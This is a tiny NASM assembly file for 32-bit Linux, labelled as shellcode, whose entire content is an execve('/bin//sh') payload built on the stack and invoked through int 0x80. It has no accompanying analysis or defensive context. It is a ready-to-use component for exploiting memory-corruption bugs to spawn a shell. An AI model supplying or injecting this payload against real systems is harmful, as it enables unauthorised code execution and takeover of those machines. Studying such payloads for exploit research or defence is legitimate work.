BITS 32
; small shellcode by block
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
mov edx, esp
push ebx
mov ecx, esp
push byte 0xb
pop eax
int 0x80
